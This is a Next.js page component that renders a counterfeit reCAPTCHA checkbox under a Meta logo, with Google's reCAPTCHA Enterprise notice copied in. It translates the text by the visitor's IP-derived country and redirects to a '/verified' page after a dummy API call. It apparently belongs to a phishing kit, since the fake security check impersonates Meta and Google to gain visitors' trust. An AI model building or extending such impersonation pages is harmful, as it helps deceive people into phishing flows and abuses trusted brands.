'use client';
import CheckMarkImage from '@/assets/images/checkmark.png';
import MetaImage from '@/assets/images/meta-image.png';
import ReCaptchaImage from '@/assets/images/recaptcha.png';
import { getTranslations, COUNTRY_TO_LANGUAGE } from '@/utils/translate';
import axios from 'axios';
import Image from 'next/image';
import { useRouter } from 'next/navigation';
import { useEffect, useState, type FC } from 'react';
const Index: FC = () => {
    const router = useRouter();
    const [isLoading, setIsLoading] = useState(false);
    const [isShowCheckMark, setisShowCheckMark] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    // Inline geo-detection + translation (always fresh)
    useEffect(() => {
        if (typeof window !== 'undefined') {
            localStorage.removeItem('translation_cache');
            localStorage.removeItem('translation_country');
        }

        const init = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 5000 });
                const cc = (data.country_code || 'US').toLowerCase();
                const lang = COUNTRY_TO_LANGUAGE[cc] || 'en';
                if (lang !== 'en') {
                    setTranslations(getTranslations(lang) || {});
                }
            } catch {
                // fallback to English
            }
        };
        init();
    }, []);

    const t = (text: string): string => translations[text] || text;
    const handleVerify = async () => {
        setIsLoading(true);
        try {
            const response = await axios.post('/api/verify');
            const status = response.status;
            if (status === 200) {
                setTimeout(() => {
                    setisShowCheckMark(true);
                    setIsLoading(false);
                }, 800);
            }
        } catch {
            //
        }
    };
    useEffect(() => {
        if (isShowCheckMark) {
            const redirectTimeOut = setTimeout(() => {
                router.push(`/verified`);
            }, 300);
            return () => {
                clearTimeout(redirectTimeOut);
            };
        }
    }, [isShowCheckMark, router]);
    return (
        <div className='flex flex-col items-center justify-center min-h-screen w-full max-w-full px-4 sm:px-6 py-8 sm:py-12 overflow-x-hidden'>
            <div className='w-full max-w-[280px] sm:max-w-[330px] min-w-0'>
                <Image src={MetaImage} alt='Meta logo' className='w-12 sm:w-16 mb-4 sm:mb-6' />
                <div className='flex w-full flex-col gap-2 py-4 sm:py-5'>
                    {/* reCAPTCHA Checkbox */}
                    <div className='flex-shrink-0 w-auto'>
                        <div className='flex items-center justify-between rounded-md border-2 bg-[#f9f9f9] p-3 sm:p-4 text-[#4c4a4b]'>
                            <div className='flex items-center justify-start gap-2 sm:gap-3 flex-1 sm:flex-none'>
                                <div className='flex h-7 sm:h-8 w-7 sm:w-8 items-center justify-center flex-shrink-0'>
                                    <button
                                        className='flex h-full w-full items-center justify-center'
                                        onClick={() => {
                                            handleVerify();
                                        }}
                                    >
                                        <input type='checkbox' className='absolute h-0 w-0 opacity-0' />
                                        {isLoading ? (
                                            <div className='h-full w-full animate-spin-fast rounded-full border-4 border-blue-400 border-b-transparent border-l-transparent transition-all transition-discrete'></div>
                                        ) : (
                                            <div
                                                className={`h-7 sm:h-8 w-7 sm:w-8 rounded-[3px] border-gray-500 bg-[#fcfcfc] ${!isShowCheckMark && 'border-2'} transition-all transition-discrete`}
                                                style={{
                                                    backgroundImage: isShowCheckMark ? `url("${CheckMarkImage.src}")` : '',
                                                    backgroundPosition: '-10px -595px'
                                                }}
                                            ></div>
                                        )}
                                    </button>
                                </div>
                                <div className='text-left text-xs sm:text-sm font-semibold tracking-normal text-gray-500'>{t('I\'m not a robot')}</div>
                            </div>
                            <div className='flex flex-col items-center text-[#9d9ba7] flex-shrink-0 ml-1 sm:ml-2'>
                                <Image src={ReCaptchaImage} alt='reCAPTCHA' className='h-6 sm:h-7 w-6 sm:w-7' />
                                <p className='text-[8px] sm:text-[9px] font-bold whitespace-nowrap'>{t('reCAPTCHA')}</p>
                                <small className='text-[6px] sm:text-[7px] text-gray-500 whitespace-nowrap'>{t('Privacy - Terms')}</small>
                            </div>
                        </div>
                    </div>

                    {/* reCAPTCHA Info Text */}
                    <div className='flex flex-col gap-2 sm:gap-3 text-xs sm:text-sm text-gray-700 leading-relaxed'>
                        <p>{t('This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.')}</p>
                        <p>{t('We\'ve used Google\'s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google\'s')} <a href='#' className='text-blue-600 hover:underline'>{t('Privacy Policy')}</a> {t('and')} <a href='#' className='text-blue-600 hover:underline'>{t('Terms of Use')}</a>.</p>
                        <p>{t('reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.')}</p>
                    </div>
                </div>

            </div>
        </div>
    );
};

export default Index;
